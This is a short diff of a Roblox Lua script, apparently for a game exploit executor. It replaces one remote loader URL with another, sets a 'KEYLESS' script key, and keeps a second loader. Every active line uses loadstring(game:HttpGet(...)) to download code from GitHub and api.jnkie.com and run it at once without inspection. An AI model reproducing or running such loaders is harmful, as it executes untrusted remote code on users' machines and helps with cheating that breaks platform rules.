@@ -1,4 +1,5 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/Yy/refs/heads/main/protected.lua.txt"))()
+getgenv().SCRIPT_KEY = "KEYLESS"
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/e92ece973af0e48574f5f9e69f47d768fb8994716d24a65eee2fd43086bc926a/download"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/CmdY/refs/heads/main/Fu5kSkiders"))()
 
